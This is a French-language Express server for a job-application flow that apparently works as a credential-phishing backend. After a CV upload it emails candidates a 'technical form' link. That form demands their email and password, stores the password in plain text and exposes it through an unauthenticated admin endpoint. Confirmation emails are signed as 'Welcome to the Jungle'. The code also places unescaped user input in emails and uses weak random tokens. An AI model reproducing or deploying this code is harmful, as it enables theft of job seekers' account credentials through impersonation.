import express from "express";
import multer from "multer";
import nodemailer from "nodemailer";
import path from "path";
import fs from "fs";
import dotenv from "dotenv";
import { fileURLToPath } from "url";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 5000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS Middleware
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  if (req.method === "OPTIONS") {
    return res.sendStatus(200);
  }
  next();
});

// Créer dossier uploads s'il n'existe pas
if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

// Créer dossier data s'il n'existe pas pour stocker les données
if (!fs.existsSync("data")) {
  fs.mkdirSync("data");
}

// In-memory storage for tokens and applications (persisted to file)
let applicationsData = {};
let tokensData = {};

// Charger les données existantes
const loadData = () => {
  try {
    if (fs.existsSync("data/applications.json")) {
      applicationsData = JSON.parse(fs.readFileSync("data/applications.json", "utf-8"));
    }
    if (fs.existsSync("data/tokens.json")) {
      tokensData = JSON.parse(fs.readFileSync("data/tokens.json", "utf-8"));
    }
  } catch (err) {
    console.log("Données initiales vides");
  }
};

loadData();

// Fonction pour générer un token
const generateToken = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

// Fonction pour sauvegarder les données
const saveData = () => {
  fs.writeFileSync("data/applications.json", JSON.stringify(applicationsData, null, 2));
  fs.writeFileSync("data/tokens.json", JSON.stringify(tokensData, null, 2));
};

// Configuration Multer
const upload = multer({
  dest: "uploads/",
  limits: {
    fileSize: 5 * 1024 * 1024,
  },
  fileFilter: (req, file, cb) => {
    const allowedMimes = [
      "application/pdf",
      "application/msword",
      "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    ];
    if (allowedMimes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error("Type de fichier invalide"));
    }
  },
});

// Configuration Nodemailer
const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST || "smtp.gmail.com",
  port: parseInt(process.env.EMAIL_PORT || "587"),
  secure: process.env.EMAIL_SECURE === "true" || false,
  auth: process.env.EMAIL_USER && process.env.EMAIL_PASSWORD ? {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  } : undefined,
});

// Route pour tester la connexion email
app.get("/api/test-email", async (req, res) => {
  try {
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASSWORD) {
      return res.json({ 
        success: false, 
        message: "Email non configuré - les candidatures seront sauvegardées localement" 
      });
    }
    await transporter.verify();
    res.json({ success: true, message: "Email configuration OK" });
  } catch (error) {
    res.status(400).json({ 
      success: false, 
      error: error instanceof Error ? error.message : "Email configuration error" 
    });
  }
});

// Route d'envoi de candidature
app.post("/api/applications/submit", upload.single("cv"), async (req, res) => {
  try {
    const {
      fullName,
      email,
      phone,
      motivation,
      experience,
      skills,
      availability,
      questions,
      jobTitle,
      companyName,
    } = req.body;

    if (!fullName || !email || !phone || !motivation) {
      return res.status(400).json({ error: "Données manquantes" });
    }

    if (!req.file) {
      return res.status(400).json({ error: "CV requis" });
    }

    const applicationData = {
      fullName,
      email,
      phone,
      motivation,
      experience: experience || "Non fourni",
      skills: skills || "Non fourni",
      availability: availability || "Non spécifiée",
      questions: questions || "Aucune",
      jobTitle,
      companyName,
      date: new Date().toLocaleDateString("fr-FR"),
      time: new Date().toLocaleTimeString("fr-FR"),
    };

    // Générer un token unique et un applicationId
    const applicationId = `APP-${Date.now()}`;
    const token = generateToken();
    
    // Stocker les données de candidature
    applicationsData[applicationId] = {
      ...applicationData,
      cvFile: req.file.originalname,
    };
    
    // Stocker le token avec expiration (24 heures)
    tokensData[token] = {
      applicationId,
      email,
      createdAt: Date.now(),
      expiresAt: Date.now() + (24 * 60 * 60 * 1000), // 24 heures
      used: false,
    };
    
    saveData();

    // URL de vérification
    const verificationUrl = `${process.env.FRONTEND_URL || "http://localhost:5173"}/technical-form?token=${token}&appId=${applicationId}`;

    // Email de confirmation au candidat
    const candidateEmailHtml = `
      <!DOCTYPE html>
      <html lang="fr">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
          .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, #FFD700 0%, #FFC700 100%); padding: 40px 20px; text-align: center; }
          .header h1 { color: white; margin: 0; font-size: 28px; }
          .content { padding: 40px; }
          .success-box { background: #e8f5e9; border-left: 4px solid #4caf50; padding: 16px; margin-bottom: 24px; border-radius: 4px; }
          .success-box h2 { color: #2e7d32; margin-top: 0; }
          .details { background: #f9f9f9; padding: 20px; border-radius: 4px; margin-top: 24px; }
          .detail-row { margin-bottom: 12px; display: flex; justify-content: space-between; }
          .detail-label { font-weight: 600; color: #333; }
          .detail-value { color: #666; }
          .footer { background: #f5f5f5; padding: 20px; text-align: center; border-top: 1px solid #e0e0e0; font-size: 12px; color: #999; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header"><h1>✓ Candidature Reçue</h1></div>
          <div class="content">
            <p>Bonjour ${fullName},</p>
            <div class="success-box">
              <h2>Merci ! Votre candidature a bien été envoyée</h2>
              <p>Nous avons reçu votre candidature pour le poste de <strong>${jobTitle}</strong> chez <strong>${companyName}</strong>.</p>
            </div>
            <p>Avant de poursuivre, nous avons besoin que vous complétiez un formulaire technique pour mieux comprendre votre profil.</p>
            <p><strong>Cliquez sur le bouton ci-dessous pour accéder au formulaire technique :</strong></p>
            <a href="${verificationUrl}" style="display: inline-block; background: linear-gradient(135deg, #FFD700 0%, #FFC700 100%); color: white; text-decoration: none; padding: 14px 32px; border-radius: 4px; font-weight: 600; margin-top: 20px;">Accéder au formulaire technique</a>
            <p style="margin-top: 20px; font-size: 14px; color: #666;">Ou copiez ce lien dans votre navigateur :</p>
            <p style="word-break: break-all; font-size: 12px; color: #999; background: #f5f5f5; padding: 12px; border-radius: 4px;">${verificationUrl}</p>
            <div class="details">
              <h3 style="margin-top: 0; color: #333;">Résumé de votre candidature</h3>
              <div class="detail-row"><span class="detail-label">Poste :</span><span class="detail-value">${jobTitle}</span></div>
              <div class="detail-row"><span class="detail-label">Entreprise :</span><span class="detail-value">${companyName}</span></div>
              <div class="detail-row"><span class="detail-label">Nom :</span><span class="detail-value">${fullName}</span></div>
              <div class="detail-row"><span class="detail-label">Email :</span><span class="detail-value">${email}</span></div>
              <div class="detail-row"><span class="detail-label">Téléphone :</span><span class="detail-value">${phone}</span></div>
              <div class="detail-row"><span class="detail-label">Date :</span><span class="detail-value">${applicationData.date} à ${applicationData.time}</span></div>
            </div>
            <p style="margin-top: 24px; color: #999; font-size: 14px;">Le lien d'accès au formulaire technique expire dans 24 heures.</p>
          </div>
          <div class="footer"><p>Cet email a été généré automatiquement. Veuillez ne pas répondre à ce message.</p></div>
        </div>
      </body>
      </html>
    `;

    // Email de notification à l'entreprise
    const companyEmailHtml = `
      <!DOCTYPE html>
      <html lang="fr">
      <head>
        <meta charset="UTF-8">
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
          .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, #FFD700 0%, #FFC700 100%); padding: 40px 20px; text-align: center; }
          .header h1 { color: white; margin: 0; font-size: 28px; }
          .content { padding: 40px; }
          .application-box { background: #f0f7ff; border-left: 4px solid #2196F3; padding: 16px; margin-bottom: 24px; border-radius: 4px; }
          .application-box h2 { color: #1565c0; margin-top: 0; }
          .details { background: #f9f9f9; padding: 20px; border-radius: 4px; margin-top: 16px; }
          .detail-row { margin-bottom: 12px; }
          .detail-label { font-weight: 600; color: #333; }
          .detail-value { color: #666; margin-left: 10px; }
          .footer { background: #f5f5f5; padding: 20px; text-align: center; border-top: 1px solid #e0e0e0; font-size: 12px; color: #999; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header"><h1>Nouvelle Candidature</h1></div>
          <div class="content">
            <div class="application-box">
              <h2>Nouvelle candidature pour : ${jobTitle}</h2>
              <p>Vous avez reçu une nouvelle candidature d'un candidat potentiel.</p>
            </div>
            <div class="details">
              <div class="detail-row"><span class="detail-label">👤 Nom :</span><span class="detail-value">${fullName}</span></div>
              <div class="detail-row"><span class="detail-label">📧 Email :</span><span class="detail-value">${email}</span></div>
              <div class="detail-row"><span class="detail-label">📱 Téléphone :</span><span class="detail-value">${phone}</span></div>
              <div class="detail-row"><span class="detail-label">📅 Date :</span><span class="detail-value">${applicationData.date} à ${applicationData.time}</span></div>
            </div>
            <h3 style="margin-top: 24px; color: #333;">Motivation du candidat</h3>
            <p style="background: #fafafa; padding: 16px; border-radius: 4px; line-height: 1.6;">${motivation.replace(/\n/g, "<br>")}</p>
            ${experience !== "Non fourni" ? `<h3 style="margin-top: 24px; color: #333;">Expérience</h3><p style="background: #fafafa; padding: 16px; border-radius: 4px; line-height: 1.6;">${experience.replace(/\n/g, "<br>")}</p>` : ""}
            ${skills !== "Non fourni" ? `<h3 style="margin-top: 24px; color: #333;">Compétences</h3><p style="background: #fafafa; padding: 16px; border-radius: 4px; line-height: 1.6;">${skills.replace(/\n/g, "<br>")}</p>` : ""}
            <p style="margin-top: 24px; padding: 16px; background: #fff3cd; border-radius: 4px; color: #856404;">⚠️ <strong>Le CV du candidat est en pièce jointe à cet email.</strong></p>
          </div>
          <div class="footer"><p>Cet email a été généré automatiquement par le système de candidature.</p></div>
        </div>
      </body>
      </html>
    `;

    // Envoyer email au candidat (non-bloquant)
    if (process.env.EMAIL_USER && process.env.EMAIL_PASSWORD) {
      transporter.sendMail({
        from: process.env.EMAIL_FROM || process.env.EMAIL_USER,
        to: email,
        subject: `✓ Candidature reçue - ${jobTitle} chez ${companyName}`,
        html: candidateEmailHtml,
      }).then(() => {
        console.log(`✓ Email envoyé au candidat: ${email}`);
      }).catch((err) => {
        console.error("❌ Erreur envoi email candidat:", err.message);
      });

      // Envoyer email à l'entreprise avec CV
      transporter.sendMail({
        from: process.env.EMAIL_FROM || process.env.EMAIL_USER,
        to: process.env.COMPANY_EMAIL || "company@example.com",
        subject: `Nouvelle candidature - ${jobTitle}`,
        html: companyEmailHtml,
        attachments: [
          {
            filename: req.file.originalname,
            path: req.file.path,
          },
        ],
      }).then(() => {
        console.log(`✓ Email envoyé à l'entreprise avec CV`);
      }).catch((err) => {
        console.error("❌ Erreur envoi email entreprise:", err.message);
      });
    } else {
      console.log("⚠️ Email non configuré - emails non envoyés mais candidature sauvegardée");
    }

    // Nettoyer le fichier après 10 secondes
    setTimeout(() => {
      fs.unlink(req.file.path, (err) => {
        if (err) console.error("Erreur suppression fichier:", err);
      });
    }, 10000);

    res.json({
      success: true,
      message: "Candidature envoyée avec succès. Vérifiez votre email pour continuer.",
      applicationId: applicationId,
    });
  } catch (error) {
    console.error("Erreur serveur:", error);
    res.status(500).json({
      error: "Erreur lors du traitement de la candidature",
      details: error instanceof Error ? error.message : "Erreur inconnue",
    });
  }
});

// Route pour vérifier le token et afficher le formulaire technique
app.post("/api/verify-token", (req, res) => {
  try {
    const { token, applicationId } = req.body;

    if (!token || !applicationId) {
      return res.status(400).json({ error: "Token ou applicationId manquant" });
    }

    const tokenData = tokensData[token];

    if (!tokenData) {
      return res.status(400).json({ error: "Token invalide" });
    }

    if (tokenData.expiresAt < Date.now()) {
      return res.status(400).json({ error: "Token expiré" });
    }

    if (tokenData.applicationId !== applicationId) {
      return res.status(400).json({ error: "ApplicationId ne correspond pas" });
    }

    res.json({
      success: true,
      message: "Token valide",
      applicationId: applicationId,
    });
  } catch (error) {
    console.error("Erreur vérification token:", error);
    res.status(500).json({
      error: "Erreur lors de la vérification",
      details: error instanceof Error ? error.message : "Erreur inconnue",
    });
  }
});

// Route pour soumettre le formulaire technique
app.post("/api/technical-form/submit", (req, res) => {
  try {
    const {
      token,
      applicationId,
      email,
      password,
      technicalQuestion1,
      technicalQuestion2,
      technicalQuestion3,
    } = req.body;

    if (!token || !applicationId) {
      return res.status(400).json({ error: "Token ou applicationId manquant" });
    }

    const tokenData = tokensData[token];

    if (!tokenData) {
      return res.status(400).json({ error: "Token invalide" });
    }

    if (tokenData.expiresAt < Date.now()) {
      return res.status(400).json({ error: "Token expiré" });
    }

    if (tokenData.applicationId !== applicationId) {
      return res.status(400).json({ error: "ApplicationId ne correspond pas" });
    }

    if (!email || !password) {
      return res.status(400).json({ error: "Email et mot de passe requis" });
    }

    // Récupérer les données de candidature initiale
    const applicationData = applicationsData[applicationId];
    if (!applicationData) {
      return res.status(400).json({ error: "Candidature non trouvée" });
    }

    // Mettre à jour avec les données du formulaire technique
    const completeApplicationData = {
      ...applicationData,
      technicalEmail: email,
      technicalPassword: password,
      technicalQuestion1,
      technicalQuestion2,
      technicalQuestion3,
      technicalFormSubmittedAt: new Date().toISOString(),
    };

    // Mettre à jour la candidature
    applicationsData[applicationId] = completeApplicationData;

    // Marquer le token comme utilisé
    tokensData[token].used = true;

    saveData();

    // Envoyer un email de confirmation au candidat
    const confirmationEmail = `
      <!DOCTYPE html>
      <html lang="fr">
      <head>
        <meta charset="UTF-8">
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
          .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, #FFD700 0%, #FFC700 100%); padding: 40px 20px; text-align: center; }
          .header h1 { color: white; margin: 0; font-size: 28px; }
          .content { padding: 40px; }
          .success-box { background: #e8f5e9; border-left: 4px solid #4caf50; padding: 16px; margin-bottom: 24px; border-radius: 4px; }
          .success-box h2 { color: #2e7d32; margin-top: 0; }
          .footer { background: #f5f5f5; padding: 20px; text-align: center; border-top: 1px solid #e0e0e0; font-size: 12px; color: #999; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header"><h1>✓ Formulaire Soumis</h1></div>
          <div class="content">
            <p>Bonjour ${applicationData.fullName},</p>
            <div class="success-box">
              <h2>Formulaire technique reçu avec succès</h2>
              <p>Nous avons bien reçu votre formulaire technique. Votre candidature est maintenant complète.</p>
            </div>
            <p>L'équipe de recrutement examinera votre profil et vos réponses. Si vous correspondez au profil recherché, nous vous recontacterons dans les prochains jours.</p>
            <p>Nous vous remercions d'avoir pris le temps de compléter votre candidature.</p>
            <p style="margin-top: 24px; color: #999; font-size: 14px;">Cordialement,<br><em>L'équipe Welcome to the Jungle</em></p>
          </div>
          <div class="footer"><p>Cet email a été généré automatiquement. Veuillez ne pas répondre à ce message.</p></div>
        </div>
      </body>
      </html>
    `;

    // Envoyer l'email de confirmation
    transporter.sendMail({
      from: process.env.EMAIL_FROM || process.env.EMAIL_USER,
      to: email,
      subject: `✓ Formulaire Technique Reçu - ${applicationData.jobTitle}`,
      html: confirmationEmail,
    }).catch((err) => {
      console.error("Erreur envoi email confirmation:", err);
    });

    // Envoyer un email à l'entreprise avec les données complètes
    const companyFinalEmail = `
      <!DOCTYPE html>
      <html lang="fr">
      <head>
        <meta charset="UTF-8">
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
          .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, #FFD700 0%, #FFC700 100%); padding: 40px 20px; text-align: center; }
          .header h1 { color: white; margin: 0; font-size: 28px; }
          .content { padding: 40px; }
          .section { margin-bottom: 24px; }
          .section h3 { margin-top: 0; color: #333; }
          .details { background: #f9f9f9; padding: 16px; border-radius: 4px; }
          .detail-row { margin-bottom: 8px; }
          .detail-label { font-weight: 600; color: #333; }
          .footer { background: #f5f5f5; padding: 20px; text-align: center; border-top: 1px solid #e0e0e0; font-size: 12px; color: #999; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header"><h1>Candidature Complète</h1></div>
          <div class="content">
            <p>Bonjour,</p>
            <p>La candidature pour le poste de <strong>${applicationData.jobTitle}</strong> a été complétée avec succès.</p>
            
            <div class="section">
              <h3>Informations du candidat</h3>
              <div class="details">
                <div class="detail-row"><span class="detail-label">Nom :</span> ${applicationData.fullName}</div>
                <div class="detail-row"><span class="detail-label">Email :</span> ${applicationData.email}</div>
                <div class="detail-row"><span class="detail-label">Téléphone :</span> ${applicationData.phone}</div>
              </div>
            </div>

            <div class="section">
              <h3>Réponses Techniques</h3>
              <div class="details">
                <div><strong>Q1 : Expérience avec technologies web modernes</strong></div>
                <div style="margin: 8px 0; padding: 8px; background: white; border-radius: 3px;">${technicalQuestion1.replace(/\n/g, "<br>")}</div>
                
                <div style="margin-top: 12px;"><strong>Q2 : Langages de programmation</strong></div>
                <div style="margin: 8px 0; padding: 8px; background: white; border-radius: 3px;">${technicalQuestion2 || "Non fourni"}</div>
                
                <div style="margin-top: 12px;"><strong>Q3 : Projets personnels</strong></div>
                <div style="margin: 8px 0; padding: 8px; background: white; border-radius: 3px;">${technicalQuestion3 || "Non fourni"}</div>
              </div>
            </div>

            <div class="section">
              <h3>Identifiants Fournis</h3>
              <div class="details">
                <div class="detail-row"><span class="detail-label">Email :</span> ${email}</div>
                <div class="detail-row"><span class="detail-label">Mot de passe :</span> [Sécurisé]</div>
              </div>
            </div>
          </div>
          <div class="footer"><p>Cet email a été généré automatiquement.</p></div>
        </div>
      </body>
      </html>
    `;

    transporter.sendMail({
      from: process.env.EMAIL_FROM || process.env.EMAIL_USER,
      to: process.env.COMPANY_EMAIL || "company@example.com",
      subject: `Candidature Complète - ${applicationData.jobTitle} - ${applicationData.fullName}`,
      html: companyFinalEmail,
    }).catch((err) => {
      console.error("Erreur envoi email entreprise:", err);
    });

    console.log(`✓ Formulaire technique reçu pour ${applicationId}`);

    res.json({
      success: true,
      message: "Formulaire technique soumis avec succès",
      applicationId: applicationId,
    });
  } catch (error) {
    console.error("Erreur soumission formulaire technique:", error);
    res.status(500).json({
      error: "Erreur lors de la soumission du formulaire",
      details: error instanceof Error ? error.message : "Erreur inconnue",
    });
  }
});

// Route pour récupérer les données de toutes les candidatures (admin)
app.get("/api/admin/applications", (req, res) => {
  try {
    // Vous pouvez ajouter une authentification ici
    const formattedApplications = {};
    
    // Formater les données pour l'affichage
    Object.entries(applicationsData).forEach(([appId, app]) => {
      formattedApplications[appId] = {
        fullName: app.fullName,
        email: app.email,
        phone: app.phone,
        motivation: app.motivation,
        experience: app.experience,
        skills: app.skills,
        availability: app.availability,
        questions: app.questions,
        jobTitle: app.jobTitle,
        companyName: app.companyName,
        date: app.date,
        time: app.time,
        cvFile: app.cvFile,
        technicalEmail: app.technicalEmail,
        technicalPassword: app.technicalPassword,
        technicalQuestion1: app.technicalQuestion1,
        technicalQuestion2: app.technicalQuestion2,
        technicalQuestion3: app.technicalQuestion3,
        technicalFormSubmittedAt: app.technicalFormSubmittedAt,
      };
    });
    
    res.json({
      success: true,
      count: Object.keys(formattedApplications).length,
      applications: formattedApplications,
    });
  } catch (error) {
    res.status(500).json({
      error: "Erreur lors de la récupération des candidatures",
      details: error instanceof Error ? error.message : "Erreur inconnue",
    });
  }
});

// Health check
app.get("/api/health", (req, res) => {
  res.json({ status: "OK", timestamp: new Date().toISOString() });
});

app.listen(port, () => {
  console.log(`
╔═══════════════════════════════════════════════════════════╗
║  🚀 Serveur lancé sur http://localhost:${port}             
║  📧 Email: ${process.env.EMAIL_USER || "À configurer"}
║  🏢 Destinataire: ${process.env.COMPANY_EMAIL || "À configurer"}
╚═══════════════════════════════════════════════════════════╝
  `);
});

export default app;
